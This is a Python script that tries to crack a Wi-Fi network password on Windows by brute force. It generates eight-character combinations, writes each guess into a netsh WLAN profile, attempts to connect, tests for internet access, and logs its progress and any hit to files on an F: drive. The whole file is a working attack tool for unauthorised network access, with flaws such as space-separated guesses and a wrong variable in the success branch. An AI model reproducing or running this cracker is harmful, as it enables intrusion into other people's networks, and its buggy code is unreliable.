###     Created By Devansh Mathur               ###

#1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()~`_-=[]{}\|;':"<>?,./
l=[i for i in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890@"]
# import module
import os
from urllib.request import urlopen
import time
# Enter Wi-Fi Network Name
wifi_name = "Wi-Fi Name"

# function to establish a new connection
def createNewConnection(name, SSID, password):
	config = """<?xml version=\"1.0\"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
	<name>"""+name+"""</name>
	<SSIDConfig>
		<SSID>
			<name>"""+SSID+"""</name>
		</SSID>
	</SSIDConfig>
	<connectionType>ESS</connectionType>
	<connectionMode>auto</connectionMode>
	<MSM>
		<security>
			<authEncryption>
				<authentication>WPA2PSK</authentication>
				<encryption>AES</encryption>
				<useOneX>false</useOneX>
			</authEncryption>
			<sharedKey>
				<keyType>passPhrase</keyType>
				<protected>false</protected>
				<keyMaterial>"""+password+"""</keyMaterial>
			</sharedKey>
		</security>
	</MSM>
</WLANProfile>"""
	command = "netsh wlan add profile filename=\""+name+".xml\""+" interface=Wi-Fi"
	with open(name+".xml", 'w') as file:
		file.write(config)
	os.system(command)
              
# function to connect to a network	
def connect(name, SSID):
	command = "netsh wlan connect name=\""+name+"\" ssid=\""+SSID+"\" interface=Wi-Fi"
	return os.system(command)

# function to display avavilabe Wifi networks	
def displayAvailableNetworks():
	command = "netsh wlan show networks interface=Wi-Fi"
	os.system(command)


def internet_on():
        global ch
        try:
                response=urlopen('http://www.google.com/').read()
                ch = True
                
        except Exception as e:
                ch=False


def s(t):
        while(t):
                time.sleep(1)
                t-=1

z=''
displayAvailableNetworks()

ch=False
n=len(l)
try:
        f = open("done.txt", "r")
        li=f.readlines()
        d=[int(i) for i in li[-1].split()]
except:
        d=[0,0,0,0,0,0,0,0]


for i1 in range(d[0],n):
        for i2 in range(d[1],n):
                for i3 in range(d[2],n):
                        for i4 in range(d[3],n):
                                for i5 in range(d[4],n):
                                        for i6 in range(d[5],n):
                                                for i7 in range(d[6],n):
                                                        for i8 in range(d[7],n):
                                                                z=l[i1]+" "+l[i2]+" "+l[i3]+" "+l[i4]+" "+l[i5]+" "+l[i6]+" "+l[i7]+" "+l[i8]
                                                                print(d,"->",z,"->",end=" ")
                                                                createNewConnection(wifi_name, wifi_name, z)
                                                                connect(wifi_name, wifi_name)
                                                                s(4)
                                                                internet_on()
                                                                s(5)
                                                                print(ch)
                                                                f = open("F:\done.txt", "a")
                                                                f.write(str(i1)+" "+str(i2)+" "+str(i3)+" "+str(i4)+" "+str(i5)+" "+str(i6)+" "+str(i7)+" "+str(i8)+"\n")
                                                                f.close()
                                                                if(ch):
                                                                        f = open("F:\password.txt", "a")
                                                                        f.write(i+"\n")
                                                                        f.close()
                                                                        break
                                                        else:
                                                                d[7]=0
                                                else:
                                                        d[6]=0
                                        else:
                                                d[5]=0
                                else:
                                        d[4]=0
                        else:
                                d[3]=0
                else:
                        d[2]=0
        else:
                d[1]=0
else:
        d[0]=0
        print("Password Not found")

